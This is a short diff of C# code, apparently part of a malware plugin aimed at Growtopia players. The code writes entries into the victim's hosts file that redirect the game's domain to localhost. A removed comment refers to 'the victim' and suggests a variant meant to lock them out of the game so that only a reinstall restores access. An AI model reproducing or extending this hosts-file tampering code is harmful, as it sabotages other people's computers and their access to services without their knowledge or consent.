@@ -21,8 +21,7 @@ namespace NusumuPlugintest
             {
                 stream.WriteLine("\n" +
                     "127.0.0.1 growtopia1.com\n" +
-                    "127.0.0.1 growtopia1.com\n");/*If you want you can change them to 127.0.0.1 growtopia7.com
-             that will make the victim unable to connect also this can not be fixed by deleting hosts file, the only fix is reinstalling growtopia.*/
+                    "127.0.0.1 growtopia1.com\n");
             }
         }
     }
